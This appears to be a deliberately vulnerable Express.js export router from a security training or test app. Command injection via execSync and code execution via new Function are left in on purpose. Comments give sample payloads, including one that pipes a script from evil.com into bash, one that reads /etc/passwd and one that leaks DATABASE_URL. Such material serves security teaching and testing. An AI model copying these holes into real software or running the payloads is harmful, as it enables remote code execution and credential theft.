// ============================================================
// VULNERABILITY #12: Insecure Deserialization + Command Injection (CWE-502 / CWE-78)
// Attacker can execute arbitrary commands through unsafe eval/deserialization
// ============================================================

const express = require('express');
const router = express.Router();
const { execSync } = require('child_process');

// Helper function to safely parse filter expressions
// Only allow simple JSON-like filter objects with limited operators
function safeParseFilter(filterStr) {
  // Basic validation: filter must be a JSON object string
  // Reject if contains characters that could lead to code execution
  if (typeof filterStr !== 'string') {
    throw new Error('Filter must be a string');
  }

  // Disallow characters that are not allowed in JSON
  // Allow only whitespace, digits, letters, underscore, colon, comma, braces, brackets, quotes, dollar sign, and operators $gt, $lt, $eq, $ne
  // This is a whitelist approach to prevent code injection
  const allowedPattern = /^[\s\d\w\{\}\[\]\:\,\"\'\$\_\>\<\=\!\-]+$/;
  if (!allowedPattern.test(filterStr)) {
    throw new Error('Filter contains invalid characters');
  }

  // Attempt to parse JSON safely
  // Replace single quotes with double quotes for JSON parsing
  let jsonStr = filterStr.replace(/'/g, '"');

  // Validate that the string is a valid JSON object
  let parsed;
  try {
    parsed = JSON.parse(jsonStr);
  } catch (e) {
    throw new Error('Filter is not valid JSON');
  }

  // Additional validation: ensure parsed is an object
  if (typeof parsed !== 'object' || parsed === null || Array.isArray(parsed)) {
    throw new Error('Filter must be a JSON object');
  }

  // Optionally, validate keys and values recursively to allow only expected operators
  function validateObject(obj) {
    for (const key in obj) {
      if (typeof key !== 'string') {
        throw new Error('Filter keys must be strings');
      }
      // Allow keys to be alphanumeric or start with $ for operators
      if (!/^\$?[a-zA-Z0-9_]+$/.test(key)) {
        throw new Error('Invalid filter key: ' + key);
      }
      const val = obj[key];
      if (val && typeof val === 'object') {
        validateObject(val);
      } else if (typeof val !== 'string' && typeof val !== 'number' && typeof val !== 'boolean' && val !== null) {
        throw new Error('Invalid filter value type');
      }
    }
  }

  validateObject(parsed);

  return parsed;
}

// POST /api/export/query
// Body: { "filter": "({amount: {$gt: 1000}})" }
// Fixed: Removed unsafe eval() and replaced with safe JSON parsing and validation
router.post('/query', (req, res) => {
  const { filter, format } = req.body;

  if (!filter) {
    return res.status(400).json({ error: 'Filter expression is required' });
  }

  try {
    // FIXED: Removed eval() to prevent Remote Code Execution
    // Instead, safely parse filter string as JSON with strict validation
    const parsedFilter = safeParseFilter(filter);

    // Simulate filtered data export
    const mockData = [
      { id: 1, account: 'ACC-001', amount: 5000, date: '2026-01-15' },
      { id: 2, account: 'ACC-002', amount: 12000, date: '2026-01-20' },
      { id: 3, account: 'ACC-003', amount: 800, date: '2026-02-01' },
    ];

    res.json({
      format: format || 'json',
      results: mockData,
      filter_applied: JSON.stringify(parsedFilter),
    });
  } catch (err) {
    res.status(400).json({ error: `Invalid filter expression: ${err.message}` });
  }
});

// VULNERABLE: Command Injection in PDF export via filename
// GET /api/export/pdf?filename=report;cat /etc/passwd
router.get('/pdf', (req, res) => {
  const { filename } = req.query;
  const reportName = filename || 'transaction-report';

  try {
    // VULNERABLE: User input directly in shell command
    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
    const command = `echo "Generating PDF: ${reportName}" && date`;
    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });

    res.json({
      success: true,
      message: `PDF export initiated for: ${reportName}`,
      debug: output,
    });
  } catch (err) {
    res.status(500).json({ error: `Export failed: ${err.message}` });
  }
});

// VULNERABLE: Template injection via user-controlled template string
// POST /api/export/custom
router.post('/custom', (req, res) => {
  const { template, data } = req.body;

  if (!template) {
    return res.status(400).json({ error: 'Template string is required' });
  }

  try {
    // VULNERABLE: new Function() with user input - Code execution
    // Attacker: { "template": "return process.env.DATABASE_URL" }
    const renderer = new Function('data', template);
    const result = renderer(data || {});

    res.json({ rendered: result });
  } catch (err) {
    res.status(400).json({ error: `Template error: ${err.message}` });
  }
});

module.exports = router;